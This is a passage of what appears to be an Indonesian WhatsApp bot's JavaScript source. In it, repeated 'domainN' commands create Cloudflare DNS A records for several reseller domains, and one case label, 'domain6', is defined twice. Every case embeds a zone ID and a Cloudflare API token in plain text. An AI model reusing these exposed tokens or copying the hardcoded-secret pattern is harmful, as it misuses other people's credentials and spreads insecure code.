             if (e['success']) rzxReply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By RIZXVELZ OFFC⚡_*\n\n*_Join group gua dong cik mau bagi"vps:_*\n*_https://chat.whatsapp.com/CfbyBQFi0jT8rqjEjRl8vy _*`);
             else rzxReply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           
           
          
           
           
  
           
           
               break
           case 'domain3': {
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "0cf0d98bcb60af202ad5816f672ca471";
               let apitoken = "f5ApkZpsRdJxTuA0xlfr9vCJ1bknGAAJ7rv10H_f";
               let tld = "sellerpanell-store.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return rzxReply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return rzxReply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return rzxReply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) rzxReply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By RIZXVELZ OFFC⚡_*\n\n*_Join group gua dong cik mau bagi"vps:_*\n*_https://chat.whatsapp.com/CfbyBQFi0jT8rqjEjRl8vy _*`);
             else rzxReply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           
            break
case 'domain4': {
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "95a92e2d61881587d97147504adae179";
               let apitoken = "Gh2ZG8DO7MoD7behXJc9NilacIdSv9o1BnMxiY-S";
               let tld = "mypanell-store.com";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return rzxReply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return rzxReply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return rzxReply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) rzxReply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By RIZXVELZ OFFC⚡_*\n\n*_Join group gua dong cik mau bagi"vps:_*\n*_https://chat.whatsapp.com/CfbyBQFi0jT8rqjEjRl8vy _*`);
             else rzxReply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           
           break
           case 'domain5': {
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "e907dafdca23667a2b5736c14243546c";
               let apitoken = "Bp_SbjAyWSbhglC6YqyLAjUrbhc8Xzx7cYDOWA4R";
               let tld = "panelstoreku.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return rzxReply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return rzxReply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return rzxReply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) rzxReply(`berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else rzxReply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
	case 'domain6': {
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "d2cfda818701061d6f6fb945656f15a0";
               let apitoken = "Bp_SbjAyWSbhglC6YqyLAjUrbhc8Xzx7cYDOWA4R";
               let tld = "panel-turzz.me";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return rzxReply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return rzxReply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return rzxReply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) rzxReply(`berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else rzxReply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
          case 'domain6': {
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "e13ba8568f6e44ca927569da961d9eb6";
               let apitoken = "bTF2B2fQNe0nJL62gTuGQEbeZCEbOC0FpGWB-ESr";
               let tld = "rafatharofficial.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return rzxReply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return rzxReply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return rzxReply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) rzxReply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By ᐯᴀʟʟᴢOғғᴄ⚡_*`);
             else rzxReply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           
           break
           case 'domain7': {
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "754b80a855a0be5f8408362be027de47";
               let apitoken = "Bp_SbjAyWSbhglC6YqyLAjUrbhc8Xzx7cYDOWA4R";
               let tld = "panelanimeku.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return rzxReply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return rzxReply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return rzxReply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) rzxReply(`berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else rzxReply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           
            break
           case 'domain8': {
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "0732cec5bce56eb1080ccde36e41a21e";
               let apitoken = "Bp_SbjAyWSbhglC6YqyLAjUrbhc8Xzx7cYDOWA4R";
               let tld = "turzcloud.tech";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return rzxReply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return rzxReply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return rzxReply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) rzxReply(`┏━━━━━━━━━━━━━━━━━━━
┣ Ip = ${e['ip']}
┗━━━━━━━━━━━━━━━━━━━
┣ Username = ${e['name']}
┗━━━━━━━━━━━━━━━━━━━
┣ 🩸⃟༑⌁⃰𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠
┗━━━━━━━━━━━━━━━━━━━`);
             else rzxReply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break        
         case 'domain9': {
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "f267a35df1d1b1de6ad8d64a0b7b4fde";
               let apitoken = "Bp_SbjAyWSbhglC6YqyLAjUrbhc8Xzx7cYDOWA4R";
               let tld = "cloudxingyu.me";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return rzxReply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return rzxReply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return rzxReply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) rzxReply(`┏━━━━━━━━━━━━━━━━━━━
┣ Ip = ${e['ip']}
┗━━━━━━━━━━━━━━━━━━━
┣ Username = ${e['name']}
┗━━━━━━━━━━━━━━━━━━━
┣ 🩸⃟༑⌁⃰𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠
┗━━━━━━━━━━━━━━━━━━━`);
             else rzxReply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
            break
   case 'domain10': {
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "fb14e64f34403687018df4c6281b5055";
               let apitoken = "Bp_SbjAyWSbhglC6YqyLAjUrbhc8Xzx7cYDOWA4R";
               let tld = "xinyustore.tech";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return rzxReply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return rzxReply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return rzxReply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) rzxReply(`┏━━━━━━━━━━━━━━━━━━━
┣ Ip = ${e['ip']}
┗━━━━━━━━━━━━━━━━━━━
┣ Username = ${e['name']}
┗━━━━━━━━━━━━━━━━━━━
┣ 🩸⃟༑⌁⃰𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠
┗━━━━━━━━━━━━━━━━━━━`);
             else rzxReply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break   
    case 'domain11': {
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "a33497f2438c716b86d470f0dbd3c0ca";
               let apitoken = "Bp_SbjAyWSbhglC6YqyLAjUrbhc8Xzx7cYDOWA4R";
               let tld = "panel-store.games";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return rzxReply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return rzxReply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return rzxReply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) rzxReply(`┏━━━━━━━━━━━━━━━━━━━
┣ Ip = ${e['ip']}
┗━━━━━━━━━━━━━━━━━━━
┣ Username = ${e['name']}
┗━━━━━━━━━━━━━━━━━━━
┣ 🩸⃟༑⌁⃰𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠
┗━━━━━━━━━━━━━━━━━━━`);
             else rzxReply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break   
     case 'domain12': {
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "974f191d5c51f390104f012eb7be6a02";
               let apitoken = "Bp_SbjAyWSbhglC6YqyLAjUrbhc8Xzx7cYDOWA4R";
               let tld = "panelshop.live";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return rzxReply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return rzxReply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return rzxReply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) rzxReply(`┏━━━━━━━━━━━━━━━━━━━
┣ Ip = ${e['ip']}
┗━━━━━━━━━━━━━━━━━━━
┣ Username = ${e['name']}
┗━━━━━━━━━━━━━━━━━━━
┣ 🩸⃟༑⌁⃰𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠
┗━━━━━━━━━━━━━━━━━━━`);
             else rzxReply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
 break   
     case 'domain13': {
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "9670f953e1d9c37a1ae763adfd82a341";
               let apitoken = "uoCk-a1zfBIke0l4mnu1ordqs--utRp3m3ApZ3y9";
               let tld = "webhostt.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return rzxReply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return rzxReply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return rzxReply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) rzxReply(`┏━━━━━━━━━━━━━━━━━━━
┣ Ip = ${e['ip']}
┗━━━━━━━━━━━━━━━━━━━
┣ Username = ${e['name']}
┗━━━━━━━━━━━━━━━━━━━
┣ 🩸⃟༑⌁⃰𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠
┗━━━━━━━━━━━━━━━━━━━`);
             else rzxReply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break   
     case 'domain14': {
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "de86c30a6977a14d74d8bc96d737cf85";
               let apitoken = "uoCk-a1zfBIke0l4mnu1ordqs--utRp3m3ApZ3y9";
               let tld = "fadhostmarketplace.me";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return rzxReply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return rzxReply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return rzxReply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) rzxReply(`┏━━━━━━━━━━━━━━━━━━━
┣ Ip = ${e['ip']}
┗━━━━━━━━━━━━━━━━━━━
┣ Username = ${e['name']}
┗━━━━━━━━━━━━━━━━━━━
┣ 🩸⃟༑⌁⃰𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠
┗━━━━━━━━━━━━━━━━━━━`);
             else rzxReply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break   
     case 'domain15': {
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "33057e29be0855f8ff6bb74feb8edb75";
               let apitoken = "uoCk-a1zfBIke0l4mnu1ordqs--utRp3m3ApZ3y9";
               let tld = "fadhost.tech";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return rzxReply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return rzxReply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return rzxReply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) rzxReply(`┏━━━━━━━━━━━━━━━━━━━
┣ Ip = ${e['ip']}
┗━━━━━━━━━━━━━━━━━━━
┣ Username = ${e['name']}
┗━━━━━━━━━━━━━━━━━━━
┣ 🩸⃟༑⌁⃰𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠
┗━━━━━━━━━━━━━━━━━━━`);
             else rzxReply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break   
           case 'domain16': {
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "40de7a4b822c4a5203b55797a2996443";
               let apitoken = "uoCk-a1zfBIke0l4mnu1ordqs--utRp3m3ApZ3y9";
               let tld = "e.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return rzxReply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return rzxReply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
